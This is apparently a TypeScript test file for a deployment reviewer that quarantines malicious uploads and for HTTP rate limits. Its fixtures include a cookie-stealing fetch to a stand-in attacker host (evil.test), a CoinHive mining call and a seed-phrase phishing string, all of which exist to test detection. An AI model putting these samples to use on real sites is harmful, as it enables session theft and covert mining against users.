import assert from "node:assert/strict";
import test from "node:test";
import { reviewDeploymentFiles } from "../apps/api/src/async-security.js";
import { clientAddress, rateLimitFor } from "../apps/api/src/http-rate-limit.js";

test("async reviewer quarantines high-confidence malware ads mining and theft", () => {
  const files = new Map<string, Uint8Array>([
    ["index.js", Buffer.from("new CoinHive.Anonymous('site');")],
    ["ads.html", Buffer.from('<script src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>')],
    ["steal.js", Buffer.from("fetch('https://evil.test',{body:document.cookie})")],
  ]);
  const result = reviewDeploymentFiles(files, []);
  assert.equal(result.decision, "quarantined");
  assert.ok(result.findings.some((finding) => finding.category === "mining"));
  assert.ok(result.findings.some((finding) => finding.category === "prohibited_ads"));
  assert.ok(result.findings.some((finding) => finding.category === "credential_theft"));
});

test("async reviewer queues uncertain phishing for an operator", () => {
  const files = new Map<string, Uint8Array>([
    ["index.html", Buffer.from("<p>Please verify your account and enter your seed phrase</p>")],
  ]);
  const result = reviewDeploymentFiles(files, []);
  assert.equal(result.decision, "needs_operator");
  assert.equal(result.findings[0]?.confidence, "uncertain");
});

test("async reviewer approves a clean allowlisted build", () => {
  const files = new Map<string, Uint8Array>([
    [
      "index.js",
      Buffer.from('fetch("https://api.lokiplay.cc/v1/player-sessions")'),
    ],
  ]);
  const result = reviewDeploymentFiles(files, ["https://api.lokiplay.cc"]);
  assert.equal(result.decision, "approved");
  assert.deepEqual(result.findings, []);
});

test("async reviewer ignores inert URL strings from compiled dependencies", () => {
  const files = new Map<string, Uint8Array>([
    [
      "index.js",
      Buffer.from(
        'const documentation="https://dependency.example/docs";' +
          'fetch("https://api.lokiplay.cc/v1/player-sessions")',
      ),
    ],
  ]);
  const result = reviewDeploymentFiles(files, ["https://api.lokiplay.cc"]);
  assert.equal(result.decision, "approved");
  assert.deepEqual(result.findings, []);
});

test("async reviewer still rejects literal outbound requests", () => {
  const files = new Map<string, Uint8Array>([
    [
      "index.js",
      Buffer.from(
        'fetch("https://tracking.example/collect");' +
          'import("https://modules.example/game.js")',
      ),
    ],
  ]);
  const result = reviewDeploymentFiles(files, []);
  assert.equal(result.decision, "quarantined");
  assert.ok(
    result.findings.some((finding) => finding.code === "UNAPPROVED_NETWORK"),
  );
  assert.ok(
    result.findings.some((finding) =>
      finding.message.includes("https://modules.example"),
    ),
  );
});

test("HTTP rate limits cover account project device session deploy and webhook paths", () => {
  assert.deepEqual(rateLimitFor("POST", "/v1/organizations"), {
    limit: 10,
    window: 3600,
  });
  assert.deepEqual(rateLimitFor("POST", "/v1/cli/device/approve"), {
    limit: 20,
    window: 60,
  });
  assert.deepEqual(rateLimitFor("GET", "/v1/cli/device/abc"), {
    limit: 60,
    window: 60,
  });
  assert.deepEqual(rateLimitFor("POST", "/v1/nakama-session"), {
    limit: 60,
    window: 60,
  });
  assert.deepEqual(rateLimitFor("POST", "/v1/github/callback"), {
    limit: 30,
    window: 60,
  });
  assert.deepEqual(rateLimitFor("POST", "/v1/reports"), {
    limit: 30,
    window: 60,
  });
  assert.equal(clientAddress({ "cf-connecting-ip": "203.0.113.9" }, "10.0.0.1"), "203.0.113.9");
});
